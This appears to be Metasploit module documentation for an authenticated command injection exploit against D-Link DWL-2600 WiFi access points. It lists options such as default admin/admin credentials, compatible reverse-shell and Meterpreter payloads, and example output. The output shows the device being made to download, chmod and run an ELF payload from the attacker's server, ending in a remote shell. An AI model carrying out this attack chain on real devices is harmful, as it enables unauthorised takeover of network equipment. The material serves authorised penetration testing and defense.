# DLINK DWL-2600 Authenticated Command Injection

## Overview
DLINK DWL-2600 WiFi Access Points contain an authenticated command injection vulnerability.  This vulnerability was originally discovered by RAKI BEN HAMOUDA and posted to exploit db here: [https://www.exploit-db.com/exploits/46841](https://www.exploit-db.com/exploits/46841).

## Options
* HttpUsername - defaults to 'admin'
* HttpPassword - defaults to 'admin'
* DOWNHOST - Alternative host to request MIPS payload from.
* DOWNFILE - File name to download - defaults to a random value.
* HTTP_DELAY - Time that the HTTP Server will wait for the ELF payload request.

In addtiion you will probably want to set `LHOST` and `SRVHOST`.

## Payloads
```
msf5 exploit(linux/http/dlink_dwl_2600_command_injection) > show payloads

Compatible Payloads
===================

   #   Name                                    Disclosure Date  Rank    Check  Description
   -   ----                                    ---------------  ----    -----  -----------
   0   generic/custom                                           normal  No     Custom Payload
   1   generic/shell_bind_tcp                                   normal  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                normal  No     Generic Command Shell, Reverse TCP Inline
   3   linux/mipsle/exec                                        normal  No     Linux Execute Command
   4   linux/mipsle/meterpreter/reverse_tcp                     normal  No     Linux Meterpreter, Reverse TCP Stager
   5   linux/mipsle/meterpreter_reverse_http                    normal  No     Linux Meterpreter, Reverse HTTP Inline
   6   linux/mipsle/meterpreter_reverse_https                   normal  No     Linux Meterpreter, Reverse HTTPS Inline
   7   linux/mipsle/meterpreter_reverse_tcp                     normal  No     Linux Meterpreter, Reverse TCP Inline
   8   linux/mipsle/reboot                                      normal  No     Linux Reboot
   9   linux/mipsle/shell/reverse_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
   10  linux/mipsle/shell_bind_tcp                              normal  No     Linux Command Shell, Bind TCP Inline
   11  linux/mipsle/shell_reverse_tcp                           normal  No     Linux Command Shell, Reverse TCP Inline

```

## Example output
```
msf5 exploit(linux/http/dlink_dwl_2600_command_injection) >          
[*] Started reverse TCP handler on 192.168.0.101:4444                                                                                                                                                                
[*] 192.168.0.100:80 - Trying to login with admin / admin                                             
[+] 192.168.0.100:80 - Successful login admin/admin                                                       
[+] 192.168.0.100:80 - Received Auth token: dXXKqdASZYXccuuzDVICgKzxRyKqBXQE                                                                                                                                         
[*] 192.168.0.100:80 - Starting up our web service on http://192.168.0.101:8080/PxAlyUgUNw ...                                                                                                                       
[*] Using URL: http://192.168.0.101:8080/PxAlyUgUNw                                                       
[*] 192.168.0.100:80 - Asking the DLINK device to download http://192.168.0.101:8080/PxAlyUgUNw           
[*] Sending CGI payload using token: dXXKqdASZYXccuuzDVICgKzxRyKqBXQE                                     
[*] 192.168.0.100:80 - Sending the payload to the server...                                               
[*] 192.168.0.100:80 - Waiting for the victim to request the ELF payload...                               
[*] 192.168.0.100:80 - Asking the DLINK device to chmod PxAlyUgUNw                                        
[*] Sending CGI payload using token: dXXKqdASZYXccuuzDVICgKzxRyKqBXQE                                     
[*] 192.168.0.100:80 - Asking the DLINK device to execute PxAlyUgUNw                   
[*] Sending CGI payload using token: dXXKqdASZYXccuuzDVICgKzxRyKqBXQE                                     
[*] Command shell session 1 opened (192.168.0.101:4444 -> 192.168.0.100:39856) at 2019-12-24 11:08:47 -0600                                                                                                          
[+] Deleted /tmp/lxnlxbhr
```
